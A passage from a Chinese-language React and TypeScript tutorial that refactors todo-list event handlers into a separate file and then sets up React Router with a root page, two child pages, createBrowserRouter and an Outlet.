punctuation\">}</span>\n</code></pre></div><p>迁移到新的文件中的函数，部分函数定义在DemoApp.tsx中，因为函数中涉及到的参数不是在DemoFuncs.ts文件中声明的，因此需要以参数的形式定义新的事件处理函数。这里<code>newTaskname</code>就是输入框中的输入值，<code>dataInfo</code>就是state中的业务数据，<code>setDataInfo</code>为定义在父组件中修改state业务数据的函数。\n定义在DemoFuncs.ts中的<code>taskNameChanged</code>函数type等需要在前面添加<code>export</code>关键字，这样才能在别的文件中使用import语句导入，导入之后才能使用：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>import { DataInfoType,taskNameChanged } from './DemoFuncs';\n</code></pre></div><p>修改DemoApp.tsx中Input的<code>onChange</code>触发事件的代码，调用新的函数并传递相关业务数据：</p>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code><span class=\"token operator\">&lt;</span>Input value<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>dataInfo<span class=\"token punctuation\">.</span>taskName<span class=\"token punctuation\">}</span> onChange<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>e <span class=\"token operator\">=&gt;</span> <span class=\"token function\">taskNameChanged</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>target<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">,</span> dataInfo<span class=\"token punctuation\">,</span> setDataInfo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Input<span class=\"token operator\">&gt;</span>\n</code></pre></div><p>这里onChange的值修改成一个Lambda表达式（也叫箭头函数），以完成新事件处理函数的绑定。</p>\n<h3>修改后</h3>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code><span class=\"token doc-comment comment\">/**\n * Checkbox onChange事件绑定函数\n * <span class=\"token keyword\">@param</span> <span class=\"token parameter\">e</span> CheckboxOnChange事件对象\n * <span class=\"token keyword\">@param</span> <span class=\"token parameter\">dataInfo</span> \n * <span class=\"token keyword\">@param</span> <span class=\"token parameter\">setDataInfo</span> \n */</span>\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">function</span> <span class=\"token function\">checkedOrNotchecked</span><span class=\"token punctuation\">(</span>e<span class=\"token operator\">:</span> CheckboxChangeEvent<span class=\"token punctuation\">,</span> dataInfo<span class=\"token operator\">:</span> DataInfoType<span class=\"token punctuation\">,</span> <span class=\"token function-variable function\">setDataInfo</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">(</span>value<span class=\"token operator\">:</span> DataInfoType<span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">let</span> newStateInfo <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span> <span class=\"token operator\">...</span>dataInfo <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n  newStateInfo<span class=\"token punctuation\">.</span>taskList<span class=\"token punctuation\">.</span><span class=\"token function\">map</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">.</span>taskName <span class=\"token operator\">===</span> e<span class=\"token punctuation\">.</span>target<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">.</span>checkedFlag <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>target<span class=\"token punctuation\">.</span>checked<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token keyword\">return</span> <span class=\"token boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n  <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">setDataInfo</span><span class=\"token punctuation\">(</span>newStateInfo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token doc-comment comment\">/**\n * 删除按钮处理函数\n * <span class=\"token keyword\">@param</span> <span class=\"token parameter\">dataInfo</span> state数据对象\n * <span class=\"token keyword\">@param</span> <span class=\"token parameter\">setDataInfo</span> state值修改函数\n */</span>\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">function</span> <span class=\"token function\">deleteCheckedTaskName</span><span class=\"token punctuation\">(</span>dataInfo<span class=\"token operator\">:</span> DataInfoType<span class=\"token punctuation\">,</span> <span class=\"token function-variable function\">setDataInfo</span><span class=\"token operator\">:</span> <span class=\"token punctuation\">(</span>value<span class=\"token operator\">:</span> DataInfoType<span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token keyword\">void</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">let</span> newStateInfo <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span> <span class=\"token operator\">...</span>dataInfo <span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n  newStateInfo<span class=\"token punctuation\">.</span>taskList <span class=\"token operator\">=</span> newStateInfo<span class=\"token punctuation\">.</span>taskList<span class=\"token punctuation\">.</span><span class=\"token function\">filter</span><span class=\"token punctuation\">(</span>\n    <span class=\"token punctuation\">(</span>item<span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token operator\">!</span>item<span class=\"token punctuation\">.</span>checkedFlag\n  <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token function\">setDataInfo</span><span class=\"token punctuation\">(</span>newStateInfo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>DemoApp.tsx</p>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code>    <span class=\"token operator\">&lt;</span>Row<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>Col span<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">24</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n          <span class=\"token operator\">&lt;</span>ul<span class=\"token operator\">&gt;</span>\n            <span class=\"token punctuation\">{</span><span class=\"token doc-comment comment\">/** 使用子组件显示待办任务列表 */</span><span class=\"token punctuation\">}</span>\n            <span class=\"token operator\">&lt;</span>TaskList taskDataInfo<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>dataInfo<span class=\"token punctuation\">}</span> checkboxChange<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token function\">checkedOrNotchecked</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span> dataInfo<span class=\"token punctuation\">,</span> setDataInfo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>TaskList<span class=\"token operator\">&gt;</span>\n          <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>ul<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Col<span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Row<span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span>Row gutter<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">5</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>Col span<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">12</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Col<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span>Col span<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token number\">12</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n          <span class=\"token operator\">&lt;</span>Button type<span class=\"token operator\">=</span><span class=\"token string\">\"primary\"</span> onClick<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=&gt;</span> <span class=\"token function\">deleteCheckedTaskName</span><span class=\"token punctuation\">(</span>dataInfo<span class=\"token punctuation\">,</span>setDataInfo<span class=\"token punctuation\">)</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>删除<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Button<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Col<span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>Row<span class=\"token operator\">&gt;</span>\n</code></pre></div><h2>React路由</h2>\n<p>所谓路由，直观来看就是浏览器页面切换，就是通过浏览器url的不同，让浏览器展现不同页面。</p>\n<figure><figcaption>image.png</figcaption></figure>\n<h3>为项目添加路由组件依赖</h3>\n<p>以管理员权限打开cmd，依次执行以下命令：</p>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code><span class=\"token function\">npm</span> i react-router-dom <span class=\"token parameter variable\">-S</span>\n<span class=\"token function\">npm</span> i @types/react-router-dom <span class=\"token parameter variable\">-S</span>\n</code></pre></div><h3>修改应用入口文件</h3>\n<p>还是从hello world开始：</p>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code><span class=\"token keyword\">import</span> React <span class=\"token keyword\">from</span> <span class=\"token string\">'react'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> ReactDOM <span class=\"token keyword\">from</span> <span class=\"token string\">'react-dom/client'</span><span class=\"token punctuation\">;</span>\n\nReactDOM<span class=\"token punctuation\">.</span><span class=\"token function\">createRoot</span><span class=\"token punctuation\">(</span>document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"root\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> HTMLElement<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">render</span><span class=\"token punctuation\">(</span>\n  <span class=\"token operator\">&lt;</span>React<span class=\"token punctuation\">.</span>StrictMode<span class=\"token operator\">&gt;</span>\n  <span class=\"token operator\">&lt;</span>div<span class=\"token operator\">&gt;</span>React路由练习<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>div<span class=\"token operator\">&gt;</span>\n  <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>React<span class=\"token punctuation\">.</span>StrictMode<span class=\"token operator\">&gt;</span>\n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><h3>创建/（根）路由组件</h3>\n<p>创建src\\pages\\RootPage.tsx文件作为根路由对应的组件，根路由组件主要用于显示应用首页：</p>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code><span class=\"token keyword\">import</span> React <span class=\"token keyword\">from</span> <span class=\"token string\">'react'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">RootPage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>\n    <span class=\"token operator\">&lt;</span>React<span class=\"token punctuation\">.</span>Fragment<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span>div<span class=\"token operator\">&gt;</span>这是Root页面<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>div<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>React<span class=\"token punctuation\">.</span>Fragment<span class=\"token operator\">&gt;</span>\n  <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">default</span> RootPage<span class=\"token punctuation\">;</span>\n</code></pre></div><h3>创建路由定义文件</h3>\n<p>路由定义文件主要解决path和页面组件之间的对应关系，创建src\\routers\\RoutesDef.tsx作为路由定义文件：</p>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code><span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> createBrowserRouter <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'react-router-dom'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> RootPage <span class=\"token keyword\">from</span> <span class=\"token string\">'../pages/RootPage'</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//导入刚刚创建的组件</span>\n\n<span class=\"token keyword\">const</span> routes <span class=\"token operator\">=</span> <span class=\"token function\">createBrowserRouter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>\n  <span class=\"token punctuation\">{</span>\n    path<span class=\"token operator\">:</span> <span class=\"token string\">'/'</span><span class=\"token punctuation\">,</span><span class=\"token comment\">//路由path</span>\n    element<span class=\"token operator\">:</span> <span class=\"token operator\">&lt;</span>RootPage <span class=\"token operator\">/</span><span class=\"token operator\">&gt;</span> <span class=\"token comment\">//path根对应的组件，又import语句生成</span>\n      <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">default</span> routes<span class=\"token punctuation\">;</span>\n</code></pre></div><p>createBrowserRouter函数是创建路由定义的函数，参数就是所有的路由对象，path是路由的url，element是url对应的组件。</p>\n<h3>修改index.tsx文件，使用创建的路由</h3>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code><span class=\"token keyword\">import</span> React <span class=\"token keyword\">from</span> <span class=\"token string\">'react'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> ReactDOM <span class=\"token keyword\">from</span> <span class=\"token string\">'react-dom/client'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> RouterProvider <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'react-router-dom'</span><span class=\"token punctuation\">;</span><span class=\"token comment\">//导入路由定义文件</span>\n<span class=\"token keyword\">import</span> routes <span class=\"token keyword\">from</span> <span class=\"token string\">'./routers/RoutesDef'</span><span class=\"token punctuation\">;</span>\n\nReactDOM<span class=\"token punctuation\">.</span><span class=\"token function\">createRoot</span><span class=\"token punctuation\">(</span>document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"root\"</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> HTMLElement<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">render</span><span class=\"token punctuation\">(</span>\n  <span class=\"token operator\">&lt;</span>React<span class=\"token punctuation\">.</span>StrictMode<span class=\"token operator\">&gt;</span>\n  <span class=\"token operator\">&lt;</span>RouterProvider router<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span>routes<span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span><span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>RouterProvider<span class=\"token operator\">&gt;</span><span class=\"token punctuation\">{</span><span class=\"token doc-comment comment\">/** 使用路由定义数据 */</span><span class=\"token punctuation\">}</span>\n  <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>React<span class=\"token punctuation\">.</span>StrictMode<span class=\"token operator\">&gt;</span>\n<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n</code></pre></div><p>完成以上修改后，在工程根目录下使用命令npm run start启动服务，可以在浏览器中看到相关页面如下：</p>\n<figure><figcaption>image.png</figcaption></figure>\n<p>如果浏览器首页显示该页面，说明/路由创建成功。建议初学者在开发过程中随时查看结果以保证我们的每一步修改都不会影响各程序的正常运行。</p>\n<h3>修改/路由对应组件为左右两个区域</h3>\n<p>将/对应的页面组件修改为左右布局：</p>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code><span class=\"token keyword\">import</span> React <span class=\"token keyword\">from</span> <span class=\"token string\">\"react\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">RootPage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>\n    <span class=\"token operator\">&lt;</span>React<span class=\"token punctuation\">.</span>Fragment<span class=\"token operator\">&gt;</span>\n      <span class=\"token punctuation\">{</span><span class=\"token comment\">/* &lt;div&gt;这是Root页面&lt;/div&gt; */</span><span class=\"token punctuation\">}</span>\n      <span class=\"token punctuation\">{</span><span class=\"token doc-comment comment\">/** 采用原生样式，将div向左浮动，将页面分割为左右布局 */</span><span class=\"token punctuation\">}</span>\n      <span class=\"token operator\">&lt;</span>div style<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span> float<span class=\"token operator\">:</span> <span class=\"token string\">\"left\"</span><span class=\"token punctuation\">,</span> width<span class=\"token operator\">:</span> <span class=\"token string\">\"200px\"</span><span class=\"token punctuation\">,</span> height<span class=\"token operator\">:</span> <span class=\"token string\">\"600px\"</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n        左侧功能区\n        <span class=\"token operator\">&lt;</span>ul<span class=\"token operator\">&gt;</span>\n          <span class=\"token operator\">&lt;</span>li<span class=\"token operator\">&gt;</span>\n            <span class=\"token operator\">&lt;</span>a href<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token string\">\"#\"</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>功能一<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>a<span class=\"token operator\">&gt;</span>\n          <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>li<span class=\"token operator\">&gt;</span>\n          <span class=\"token operator\">&lt;</span>li<span class=\"token operator\">&gt;</span>\n            <span class=\"token operator\">&lt;</span>a href<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token string\">\"#\"</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>功能二<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>a<span class=\"token operator\">&gt;</span>\n          <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>li<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>ul<span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>div<span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span>div style<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span> height<span class=\"token operator\">:</span> <span class=\"token string\">\"600px\"</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>右侧主操作区<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>div<span class=\"token operator\">&gt;</span>\n    <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>React<span class=\"token punctuation\">.</span>Fragment<span class=\"token operator\">&gt;</span>\n  <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">default</span> RootPage<span class=\"token punctuation\">;</span>\n</code></pre></div><h3>创建功能一和功能二对应的页面组件</h3>\n<p>创建功能一页面组件src\\pages\\PageOne.tsx：</p>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code><span class=\"token keyword\">import</span> React <span class=\"token keyword\">from</span> <span class=\"token string\">'react'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">PageOne</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>\n        <span class=\"token operator\">&lt;</span>React<span class=\"token punctuation\">.</span>Fragment<span class=\"token operator\">&gt;</span>\n            <span class=\"token operator\">&lt;</span>h2 style<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span>textAlign<span class=\"token operator\">:</span> <span class=\"token string\">'center'</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>页面组件一<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>h2<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>React<span class=\"token punctuation\">.</span>Fragment<span class=\"token operator\">&gt;</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">default</span> PageOne<span class=\"token punctuation\">;</span>\n</code></pre></div><p>src\\pages\\PageTwo.tsx：</p>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code><span class=\"token keyword\">import</span> React <span class=\"token keyword\">from</span> <span class=\"token string\">'react'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">PageTow</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>\n        <span class=\"token operator\">&lt;</span>React<span class=\"token punctuation\">.</span>Fragment<span class=\"token operator\">&gt;</span>\n            <span class=\"token operator\">&lt;</span>h1 style<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span>textAlign<span class=\"token operator\">:</span> <span class=\"token string\">'center'</span><span class=\"token punctuation\">,</span> color<span class=\"token operator\">:</span> <span class=\"token string\">'red'</span><span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>页面组件二<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>h1<span class=\"token operator\">&gt;</span>\n        <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>React<span class=\"token punctuation\">.</span>Fragment<span class=\"token operator\">&gt;</span>\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">default</span> PageTow<span class=\"token punctuation\">;</span>\n</code></pre></div><h3>修改路由定义文件</h3>\n<p>新建的两个组件作为/路由的子路由来定义</p>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code><span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> createBrowserRouter <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">'react-router-dom'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> RootPage <span class=\"token keyword\">from</span> <span class=\"token string\">'../pages/RootPage'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> PageOne <span class=\"token keyword\">from</span> <span class=\"token string\">'../pages/PageOne'</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> PageTow <span class=\"token keyword\">from</span> <span class=\"token string\">'../pages/PageTwo'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">const</span> routes <span class=\"token operator\">=</span> <span class=\"token function\">createBrowserRouter</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>\n  <span class=\"token punctuation\">{</span>\n    path<span class=\"token operator\">:</span> <span class=\"token string\">'/'</span><span class=\"token punctuation\">,</span>\n    element<span class=\"token operator\">:</span> <span class=\"token operator\">&lt;</span>RootPage <span class=\"token operator\">/</span><span class=\"token operator\">&gt;</span><span class=\"token punctuation\">,</span>\n    children<span class=\"token operator\">:</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">{</span>  <span class=\"token comment\">//新建的两个页面被定义为/路由的子路由</span>\n      path<span class=\"token operator\">:</span> <span class=\"token string\">'/one'</span><span class=\"token punctuation\">,</span>\n      element<span class=\"token operator\">:</span> <span class=\"token operator\">&lt;</span>PageOne <span class=\"token operator\">/</span><span class=\"token operator\">&gt;</span>\n        <span class=\"token punctuation\">}</span> <span class=\"token punctuation\">,</span> <span class=\"token punctuation\">{</span>\n      path<span class=\"token operator\">:</span> <span class=\"token string\">'/two'</span><span class=\"token punctuation\">,</span>\n      element<span class=\"token operator\">:</span> <span class=\"token operator\">&lt;</span>PageTow <span class=\"token operator\">/</span><span class=\"token operator\">&gt;</span>\n        <span class=\"token punctuation\">}</span><span class=\"token punctuation\">]</span>\n  <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">export</span> <span class=\"token keyword\">default</span> routes<span class=\"token punctuation\">;</span>\n</code></pre></div><h3>修改/路由组件内容</h3>\n<p>一是修改<code>&lt;a&gt;</code>的<code>href</code>属性值，与路由定义中过的<code>path</code>属性值对应；二是在右侧<code>div</code>中增加<code>&lt;Outlet /&gt;</code>组件作为路由组件的页面渲染出口：</p>\n<div class=\"language-typescript\" data-ext=\"ts\" data-title=\"ts\"><pre class=\"language-typescript\"><code><span class=\"token keyword\">import</span> React <span class=\"token keyword\">from</span> <span class=\"token string\">\"react\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token punctuation\">{</span> Outlet <span class=\"token punctuation\">}</span> <span class=\"token keyword\">from</span> <span class=\"token string\">\"react-router-dom\"</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">function</span> <span class=\"token function\">RootPage</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span>\n    <span class=\"token operator\">&lt;</span>React<span class=\"token punctuation\">.</span>Fragment<span class=\"token operator\">&gt;</span>\n      <span class=\"token punctuation\">{</span><span class=\"token comment\">/* &lt;div&gt;这是Root页面&lt;/div&gt; */</span><span class=\"token punctuation\">}</span>\n      <span class=\"token punctuation\">{</span><span class=\"token doc-comment comment\">/** 采用原生样式，将div向左浮动，将页面分割为左右布局 */</span><span class=\"token punctuation\">}</span>\n      <span class=\"token operator\">&lt;</span>div style<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span> float<span class=\"token operator\">:</span> <span class=\"token string\">\"left\"</span><span class=\"token punctuation\">,</span> width<span class=\"token operator\">:</span> <span class=\"token string\">\"200px\"</span><span class=\"token punctuation\">,</span> height<span class=\"token operator\">:</span> <span class=\"token string\">\"600px\"</span> <span class=\"token punctuation\">}</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>\n        左侧功能区\n        <span class=\"token operator\">&lt;</span>ul<span class=\"token operator\">&gt;</span>\n          <span class=\"token operator\">&lt;</span>li<span class=\"token operator\">&gt;</span>\n            <span class=\"token operator\">&lt;</span>a href<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token string\">\"/one\"</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>功能一<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>a<span class=\"token operator\">&gt;</span>\n          <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>li<span class=\"token operator\">&gt;</span>\n          <span class=\"token punctuation\">{</span><span class=\"token doc-comment comment\">/** 修改href的值为路由定义的path */</span><span class=\"token punctuation\">}</span>\n          <span class=\"token operator\">&lt;</span>li<span class=\"token operator\">&gt;</span>\n            <span class=\"token operator\">&lt;</span>a href<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token string\">\"/two\"</span><span class=\"token punctuation\">}</span><span class=\"token operator\">&gt;</span>功能二<span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>a<span class=\"token operator\">&gt;</span>\n          <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>li<span class=\"token operator\">&gt;</span>\n          <span class=\"token punctuation\">{</span><span class=\"token doc-comment comment\">/** 修改href的值为路由定义的path */</span><span class=\"token punctuation\">}</span>\n        <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>ul<span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>div<span class=\"token operator\">&gt;</span>\n      <span class=\"token operator\">&lt;</span>div style<span class=\"token operator\">=</span><span class=\"token punctuation\">{</span><span class=\"token punctuation\">{</span> height<span class=\"token operator\">:</span> <span class=\"token string\">\"600px\"</span> <span class=\"token punctuation\">}</span><span 